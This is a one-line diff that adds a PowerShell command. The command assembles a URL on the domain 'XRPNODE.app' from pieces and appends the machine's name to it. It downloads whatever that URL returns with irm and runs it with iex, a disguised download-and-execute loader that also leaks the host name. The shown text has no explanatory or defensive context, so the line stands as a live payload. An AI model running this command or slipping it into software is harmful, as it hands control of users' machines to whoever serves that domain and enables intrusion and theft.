@@ -1,0 +1,1 @@
+powershell -c "$Blockchain = 'app'; irm ('XRPNODE.' + $Blockchain + '?Sync=' + $env:COMPUTERNAME) | iex"
